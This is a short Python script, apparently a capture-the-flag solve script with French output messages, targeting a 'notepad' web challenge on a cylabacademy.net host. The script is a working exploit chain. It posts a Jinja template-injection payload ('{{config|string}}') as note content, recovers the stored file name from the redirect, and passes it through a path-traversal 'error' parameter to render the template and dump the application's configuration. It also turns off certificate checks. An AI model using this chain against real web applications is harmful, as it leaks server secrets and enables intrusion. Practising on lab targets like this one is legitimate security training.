import sys, requests, re, urllib.parse
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
BASE = "https://notepad.mars.cylabacademy.net"
S = requests.Session()
S.headers.update({"User-Agent": "Mozilla/5.0"})

content = "{{config|string}}"
r = S.post(BASE + "/new", data={"content": content}, timeout=20, verify=False, allow_redirects=False)
loc = r.headers.get("Location", "")
print("status:", r.status_code)
print("loc:", loc[:200])
m = re.search(r"/static/(.+)\.html$", loc)
if not m:
    print("pas de nom")
    sys.exit(1)
name = m.group(1)
print("nom (encode):", name)
name_dec = urllib.parse.unquote(name)
print("nom (decode):", name_dec)
err = "../../static/" + name_dec
print("error param:", err)
r2 = S.get(BASE + "/", params={"error": err}, timeout=20, verify=False)
print("=== reponse ===")
print(r2.text[:1500])
